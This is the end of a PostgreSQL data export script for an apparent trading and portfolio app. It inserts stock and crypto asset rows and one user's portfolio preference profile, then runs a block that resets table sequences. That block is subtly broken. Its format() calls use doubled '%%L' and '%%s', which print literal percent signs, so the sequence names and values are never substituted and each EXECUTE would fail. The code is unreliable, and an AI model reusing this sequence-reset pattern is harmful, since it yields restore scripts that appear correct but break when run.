INSERT INTO "trading_assets" ("id", "symbol", "company_name", "asset_class", "exchange", "sector", "current_price", "is_active", "lot_size", "created_at", "updated_at", "tenant_id") VALUES (13, 'TCS', 'Tata Consultancy Services', 'stocks', 'NSE', 'Information Technology', NULL, TRUE, 1, '2025-10-21T13:49:57.710821', '2025-10-21T13:49:57.710821', 'live') ON CONFLICT DO NOTHING;
INSERT INTO "trading_assets" ("id", "symbol", "company_name", "asset_class", "exchange", "sector", "current_price", "is_active", "lot_size", "created_at", "updated_at", "tenant_id") VALUES (14, 'INFY', 'Infosys Limited', 'stocks', 'NSE', 'Information Technology', NULL, TRUE, 1, '2025-10-21T13:49:57.710821', '2025-10-21T13:49:57.710822', 'live') ON CONFLICT DO NOTHING;
INSERT INTO "trading_assets" ("id", "symbol", "company_name", "asset_class", "exchange", "sector", "current_price", "is_active", "lot_size", "created_at", "updated_at", "tenant_id") VALUES (15, 'BTC', 'Bitcoin', 'crypto', 'BINANCE', 'Cryptocurrency', NULL, TRUE, 1, '2025-10-21T13:49:57.710822', '2025-10-21T13:49:57.710822', 'live') ON CONFLICT DO NOTHING;
INSERT INTO "trading_assets" ("id", "symbol", "company_name", "asset_class", "exchange", "sector", "current_price", "is_active", "lot_size", "created_at", "updated_at", "tenant_id") VALUES (16, 'ETH', 'Ethereum', 'crypto', 'BINANCE', 'Cryptocurrency', NULL, TRUE, 1, '2025-10-21T13:49:57.710823', '2025-10-21T13:49:57.710823', 'live') ON CONFLICT DO NOTHING;

-- Table: portfolio_preferences
-- Exported: 2026-01-25T05:09:42.526027
-- Rows: 1

INSERT INTO "portfolio_preferences" ("id", "user_id", "age", "employment_status", "annual_income", "dependents", "marital_status", "financial_goals", "investment_horizon", "investment_horizon_years", "contribution_type", "monthly_contribution", "lump_sum_amount", "risk_tolerance", "risk_capacity", "max_acceptable_loss", "expected_return", "minimum_return_required", "liquidity_requirement", "withdrawal_frequency", "emergency_fund_months", "preferred_asset_classes", "asset_allocation_preferences", "geographic_preference", "sector_preferences", "sector_exclusions", "esg_preference", "esg_priorities", "rebalancing_frequency", "performance_review_frequency", "notification_preferences", "optimization_strategy", "tax_optimization", "dividend_preference", "special_instructions", "created_at", "updated_at", "completed", "tenant_id") VALUES (1, 35, 55, 'employed', '3l_5l', 2, 'single', '["retirement_planning"]', 'short_term', 3, 'lump_sum', 1000.0, 100000.0, 'conservative', 'low', 20.0, 30.0, 12.0, 'medium', 'none', 5, '["equities", "bonds"]', '{"equities": 59.0, "bonds": 17.0, "fo": 0.0, "real_estate": 26.0, "crypto": 0.0, "fd": 0.0, "insurance": 0.0, "cash": 0.0}', 'domestic', NULL, NULL, FALSE, NULL, 'monthly', 'monthly', NULL, 'risk_minimization', TRUE, 'growth', 'good', '2025-10-31T17:13:19.783779', '2025-10-31T17:13:19.780232', TRUE, 'live') ON CONFLICT DO NOTHING;

-- Re-enable foreign key checks
SET session_replication_role = 'origin';

-- Reset sequences to max values (only for tables with integer id)
DO $$ 
DECLARE seq_name TEXT; max_val BIGINT;
BEGIN
  SELECT pg_get_serial_sequence('"user"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "user";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"admins"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "admins";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"user_brokers"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "user_brokers";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"broker_holdings"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "broker_holdings";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"broker_positions"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "broker_positions";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"broker_orders"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "broker_orders";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"portfolio"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "portfolio";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"payment"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "payment";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"ai_stock_picks"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "ai_stock_picks";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"watchlist_item"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "watchlist_item";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"manual_equity_holdings"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "manual_equity_holdings";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"manual_mutual_fund_holdings"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "manual_mutual_fund_holdings";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"manual_fixed_deposit_holdings"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "manual_fixed_deposit_holdings";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"manual_real_estate_holdings"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "manual_real_estate_holdings";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"manual_commodity_holdings"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "manual_commodity_holdings";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"manual_cryptocurrency_holdings"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "manual_cryptocurrency_holdings";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"manual_insurance_holdings"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "manual_insurance_holdings";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"manual_bank_accounts"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "manual_bank_accounts";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"manual_futures_options_holdings"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "manual_futures_options_holdings";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"trading_signal"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "trading_signal";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"trading_assets"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "trading_assets";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"daily_trading_signals"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "daily_trading_signals";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"portfolio_preferences"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "portfolio_preferences";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
  SELECT pg_get_serial_sequence('"referral"', 'id') INTO seq_name;
  IF seq_name IS NOT NULL THEN
    SELECT COALESCE(MAX(id), 1) INTO max_val FROM "referral";
    EXECUTE format('SELECT setval(%%L, %%s)', seq_name, max_val);
  END IF;
END $$;

-- Export complete
